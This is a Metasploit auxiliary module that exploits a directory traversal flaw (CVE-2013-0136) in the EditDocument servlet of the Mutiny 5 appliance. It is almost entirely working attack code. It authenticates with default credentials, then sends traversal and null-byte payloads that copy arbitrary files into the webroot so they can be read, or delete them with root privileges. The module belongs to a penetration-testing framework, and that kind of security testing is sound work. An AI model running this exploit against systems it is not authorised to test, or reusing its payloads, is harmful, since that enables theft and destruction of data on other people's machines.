##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Mutiny 5 Arbitrary File Read and Delete',
        'Description' => %q{
          This module exploits the EditDocument servlet from the frontend on the Mutiny 5
          appliance. The EditDocument servlet provides file operations, such as copy and
          delete, which are affected by a directory traversal vulnerability. Because of this,
          any authenticated frontend user can read and delete arbitrary files from the system
          with root privileges. In order to exploit the vulnerability a valid user (any role)
          in the web frontend is required. The module has been tested successfully on the
          Mutiny 5.0-1.07 appliance.
        },
        'Author' => [
          'juan vazquez' # Metasploit module and initial discovery
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2013-0136' ],
          [ 'US-CERT-VU', '701572' ],
          [ 'URL', 'http://web.archive.org/web/20250114041839/https://www.rapid7.com/blog/post/2013/05/15/new-1day-exploits-mutiny-vulnerabilities/' ]
        ],
        'Actions' => [
          ['Read', { 'Description' => 'Read arbitrary file' }],
          ['Delete', { 'Description' => 'Delete arbitrary file' }]
        ],
        'DefaultAction' => 'Read',
        'DisclosureDate' => '2013-05-15'
      )
    )

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, 'Path to Mutiny Web Service', '/']),
        OptString.new('USERNAME', [ true, 'The user to authenticate as', 'superadmin@mutiny.com' ]),
        OptString.new('PASSWORD', [ true, 'The password to authenticate with', 'password' ]),
        OptString.new('PATH', [ true, 'The file to read or delete' ]),
      ]
    )
  end

  def run
    print_status('Trying to login')
    if login
      print_good('Login Successful')
    else
      print_error('Login failed, review USERNAME and PASSWORD options')
      return
    end

    case action.name
    when 'Read'
      read_file(datastore['PATH'])
    when 'Delete'
      delete_file(datastore['PATH'])
    end
  end

  def read_file(file)
    print_status('Copying file to Web location...')

    dst_path = '/usr/jakarta/tomcat/webapps/ROOT/m/'
    res = send_request_cgi(
      {
        'uri' => normalize_uri(target_uri.path, 'interface', 'EditDocument'),
        'method' => 'POST',
        'cookie' => "JSESSIONID=#{@session}",
        'encode_params' => false,
        'vars_post' => {
          'operation' => 'COPY',
          'paths[]' => "../../../../#{file}%00.txt",
          'newPath' => "../../../..#{dst_path}"
        }
      }
    )

    if res && (res.code == 200) && res.body =~ (/\{"success":true\}/)
      print_good("File #{file} copied to #{dst_path} successfully")
    else
      print_error("Failed to copy #{file} to #{dst_path}")
    end

    print_status('Retrieving file contents...')

    res = send_request_cgi(
      {
        'uri' => normalize_uri(target_uri.path, 'm', ::File.basename(file)),
        'method' => 'GET'
      }
    )

    if res && (res.code == 200)
      store_path = store_loot('mutiny.frontend.data', 'application/octet-stream', rhost, res.body, file)
      print_good("File successfully retrieved and saved on #{store_path}")
    else
      print_error('Failed to retrieve file')
    end

    # Cleanup
    delete_file("#{dst_path}#{::File.basename(file)}")
  end

  def delete_file(file)
    print_status("Deleting file #{file}")

    res = send_request_cgi(
      {
        'uri' => normalize_uri(target_uri.path, 'interface', 'EditDocument'),
        'method' => 'POST',
        'cookie' => "JSESSIONID=#{@session}",
        'vars_post' => {
          'operation' => 'DELETE',
          'paths[]' => "../../../../#{file}"
        }
      }
    )

    if res && (res.code == 200) && res.body =~ (/\{"success":true\}/)
      print_good("File #{file} deleted")
    else
      print_error("Error deleting file #{file}")
    end
  end

  def login
    res = send_request_cgi(
      {
        'uri' => normalize_uri(target_uri.path, 'interface', 'index.do'),
        'method' => 'GET'
      }
    )

    if res && (res.code == 200) && res.get_cookies =~ (/JSESSIONID=(.*);/)
      first_session = ::Regexp.last_match(1)
    end

    res = send_request_cgi(
      {
        'uri' => normalize_uri(target_uri.path, 'interface', 'j_security_check'),
        'method' => 'POST',
        'cookie' => "JSESSIONID=#{first_session}",
        'vars_post' => {
          'j_username' => datastore['USERNAME'],
          'j_password' => datastore['PASSWORD']
        }
      }
    )

    if !res || (res.code != 302) || res.headers['Location'] !~ (%r{interface/index.do})
      return false
    end

    res = send_request_cgi(
      {
        'uri' => normalize_uri(target_uri.path, 'interface', 'index.do'),
        'method' => 'GET',
        'cookie' => "JSESSIONID=#{first_session}"
      }
    )

    if res && (res.code == 200) && res.get_cookies =~ (/JSESSIONID=(.*);/)
      @session = ::Regexp.last_match(1)
      return true
    end

    return false
  end
end
